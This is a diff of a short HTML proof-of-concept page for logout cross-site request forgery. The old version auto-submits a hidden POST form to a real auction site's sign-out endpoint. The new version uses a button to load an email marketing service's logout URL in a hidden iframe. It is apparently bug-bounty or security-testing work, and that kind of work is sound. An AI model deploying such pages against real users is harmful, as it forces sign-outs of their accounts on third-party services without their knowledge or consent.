@@ -1,21 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>CSRF PoC</title>
+    <title>Logout CSRF Test</title>
 </head>
 <body>
+    <h2>Logout CSRF Security Test</h2>
 
-<form id="csrf"
-      action="https://account-api.playerauctions.com/api/SignIn/Logout"
-      method="POST"
-      enctype="text/plain">
-    <input type="hidden" name="{}" value="">
-</form>
+    <button onclick="testLogout()">Test Logout CSRF</button>
 
-<script>
-    document.getElementById("csrf").submit();
-</script>
+    <script>
+        function testLogout() {
+            const frame = document.createElement("iframe");
 
+            frame.style.display = "none";
+
+            frame.src = "https://www.aweber.com/users/account/logout";
+
+            document.body.appendChild(frame);
+        }
+    </script>
 </body>
 </html>
